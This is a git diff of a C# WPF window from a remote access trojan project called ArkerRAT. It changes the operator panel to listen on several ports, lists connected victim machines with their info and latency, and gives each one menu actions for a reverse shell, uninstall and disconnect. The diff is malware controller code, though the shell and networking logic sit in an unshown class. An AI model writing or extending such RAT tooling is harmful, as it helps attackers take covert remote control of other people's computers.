@@ -20,6 +20,8 @@ using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Windows.Threading;
+using System.Net;
+using System.Net.Sockets;
 
 namespace ArkerRAT1
 {
@@ -44,24 +46,24 @@ namespace ArkerRAT1
         {
             while (true)
             {
-               if(ArkerRATServerMechanics.RATClients.Count() != oldCount)
+                if (ArkerRATServerMechanics.rATClients.Count() != oldCount)
                 {
-                    oldCount = ArkerRATServerMechanics.RATClients.Count();
+                    oldCount = ArkerRATServerMechanics.rATClients.Count();
                     this.Dispatcher.Invoke(() =>
                     {
-                        clientAmountLabel.Content = ArkerRATServerMechanics.RATClients.Count();
+                        clientAmountLabel.Content = ArkerRATServerMechanics.rATClients.Count();
                         serverAmountLabel.Content = 0;
                     });
                 }
-                
+
                 Thread.Sleep(1000);
                 this.Dispatcher.Invoke(() =>
                 {
+                    //ArkerRATServerMechanics.port = Convert.ToInt32(portInput.Text);
                     LoadCLients();
                 });
             }
         }
-
 
         private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
         {
@@ -146,7 +148,7 @@ namespace ArkerRAT1
         //Settings
         private void crypterOn_Checked(object sender, RoutedEventArgs e)
         {
-            this.Opacity = 0.95;   
+            this.Opacity = 0.95;
         }
 
         private void crypterOff_Checked(object sender, RoutedEventArgs e)
@@ -165,29 +167,31 @@ namespace ArkerRAT1
                "All the available clients will be shown at the clients tab.");
         }
 
-        int check = 1;
-        private void Listener(object sender, RoutedEventArgs e)
+        private async void Listener(object sender, RoutedEventArgs e)
         {
-            ArkerRATServerMechanics.port = Convert.ToInt32(portInput.Text);
-            //Every other time it should stop the listener -1*-1 or 1*-1.
-            check = check * -1;
-            if (check == -1)
-            {
-                try
-                {
-                    listenerButton.Content = "Stop listening";
-                    ArkerRATServerMechanics.StartServer();
-                }
-                catch (Exception ex)
-                {
-                    listenerButton.Content = "Start listening";
-                }
-            }
-            else
-            {
-                ArkerRATServerMechanics.StopListener();
-                listenerButton.Content = "Start listening for connections";
-            }
+            Button serverButton = new Button();
+            serverButton.Width = 700;
+            serverButton.Height = 50;
+            System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
+            System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
+            serverButton.BorderBrush = new SolidColorBrush(arkerPurple);
+            serverButton.Foreground = new SolidColorBrush(arkerPurple);
+            serverButton.Background = new SolidColorBrush(arkerGrey);
+            serverButton.Content = portInput.Text;
+            serverButton.Click += new RoutedEventHandler(RemoveServer);
+            serverButton.Tag = Convert.ToInt32(portInput.Text);
+            loadServers.Items.Add(serverButton);
+            ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
+            ArkerRATServerMechanics.StartServer();
+        }
+
+        private async void RemoveServer(object sender, RoutedEventArgs e)
+        {
+            Button button = (Button)sender;
+            ArkerRATServerMechanics.ports.Remove((int)button.Tag);
+            ArkerRATServerMechanics.StopListener();
+            ArkerRATServerMechanics.StartServer();
+            loadServers.Items.Remove(button);
         }
 
         public void CyperTools(Button clientButton)
@@ -197,7 +201,7 @@ namespace ArkerRAT1
             reversShellButton.Icon = new System.Windows.Controls.Image
             {
                 Stretch = Stretch.Fill,
-                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\bin\\Debug\\icons\\cmd.png"))
+                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\cmd.png"))
             };
 
             MenuItem unInstall = new MenuItem();
@@ -205,7 +209,7 @@ namespace ArkerRAT1
             unInstall.Icon = new System.Windows.Controls.Image
             {
                 Stretch = Stretch.Fill,
-                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\bin\\Debug\\icons\\remove.png"))
+                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\remove.png"))
             };
 
             MenuItem disconnect = new MenuItem();
@@ -213,7 +217,7 @@ namespace ArkerRAT1
             disconnect.Icon = new System.Windows.Controls.Image
             {
                 Stretch = Stretch.Fill,
-                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\bin\\Debug\\icons\\remove.png"))
+                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\remove.png"))
             };
 
             clientButton.ContextMenu = new ContextMenu();
@@ -226,41 +230,34 @@ namespace ArkerRAT1
 
             clientButton.ContextMenu.Visibility = Visibility.Visible;
 
-            for (int y = 0; y < ArkerRATServerMechanics.RATClients.Count; y++)
+            for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
             {
-                if (ArkerRATServerMechanics.RATClients[y].clientButton.Tag as string == clientButton.Tag as string)
+                if (ArkerRATServerMechanics.rATClients[y].clientButton.Tag as string == clientButton.Tag as string)
                 {
-                    reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.RATClients[y].StartReverseShell);
-                    unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.RATClients[y].Uninstall);
-                    disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.RATClients[y].Disconnect);
+                    reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartReverseShell);
+                    unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Uninstall);
+                    disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
                 }
-            }            
+            }
         }
 
         public void LoadCLients()
         {
-            try
-            {
-                loadClients.Items.Clear();
-                for (int y = 0; y < ArkerRATServerMechanics.RATClients.Count; y++)
-                {
-                    ArkerRATServerMechanics.RATClients[y].clientButton.Width = 700;
-                    ArkerRATServerMechanics.RATClients[y].clientButton.Height = 50;
-                    System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
-                    System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
-                    ArkerRATServerMechanics.RATClients[y].clientButton.BorderBrush = new SolidColorBrush(arkerPurple);
-                    ArkerRATServerMechanics.RATClients[y].clientButton.Foreground = new SolidColorBrush(arkerPurple);
-                    ArkerRATServerMechanics.RATClients[y].clientButton.Background = new SolidColorBrush(arkerGrey);
-                    ArkerRATServerMechanics.RATClients[y].clientButton.Content = ArkerRATServerMechanics.RATClients[y].userName + "                      " + ArkerRATServerMechanics.RATClients[y].OSVersion +"                      " + ArkerRATServerMechanics.RATClients[y].iPadress+ "                            " + ArkerRATServerMechanics.RATClients[y].ms+"ms";
-                    loadClients.Items.Add(ArkerRATServerMechanics.RATClients[y].clientButton);
-                    CyperTools(ArkerRATServerMechanics.RATClients[y].clientButton);
-                }
-            }
-            catch (Exception ex)
-            {
 
+            loadClients.Items.Clear();
+            for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
+            {
+                ArkerRATServerMechanics.rATClients[y].clientButton.Width = 700;
+                ArkerRATServerMechanics.rATClients[y].clientButton.Height = 50;
+                System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
+                System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
+                ArkerRATServerMechanics.rATClients[y].clientButton.BorderBrush = new SolidColorBrush(arkerPurple);
+                ArkerRATServerMechanics.rATClients[y].clientButton.Foreground = new SolidColorBrush(arkerPurple);
+                ArkerRATServerMechanics.rATClients[y].clientButton.Background = new SolidColorBrush(arkerGrey);
+                ArkerRATServerMechanics.rATClients[y].clientButton.Content = ArkerRATServerMechanics.rATClients[y].clientInfo + "                            " + ArkerRATServerMechanics.rATClients[y].ms + "ms";
+                loadClients.Items.Add(ArkerRATServerMechanics.rATClients[y].clientButton);
+                CyperTools(ArkerRATServerMechanics.rATClients[y].clientButton);
             }
-
         }
     }
 }
